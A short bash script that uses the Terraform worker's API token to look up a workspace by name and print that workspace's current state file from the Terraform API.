# If an argument is supplied, use this as TF workspace name
# Otherwise use the existing one from the TF worker's env
if [ -n "$1" ]
then
    ORG=$(echo $ATLAS_WORKSPACE_SLUG | cut -d '/' -f 1)
    ATLAS_WORKSPACE_SLUG=$ORG/$1
fi

# Fetch the workspace id by describing the TF workspace by name
id=$(curl --header "Authorization: Bearer $ATLAS_TOKEN"   --header "Content-Type: application/vnd.api+json" $ATLAS_ADDRESS/api/v2/organizations/$(echo $ATLAS_WORKSPACE_SLUG | sed 's/\//\/workspaces\//g') | grep -o 'ws[^\"]*' | head -1)
# Fetch the current-state-version URL of the TF workspace
state_url=$(curl --header "Authorization: Bearer $ATLAS_TOKEN"   --header "Content-Type: application/vnd.api+json" $ATLAS_ADDRESS/api/v2/workspaces/$id/current-state-version | grep hosted-state-download-url | grep -o 'https[^\"]*')
# Retrive the state and print it to the stdout
curl $state_url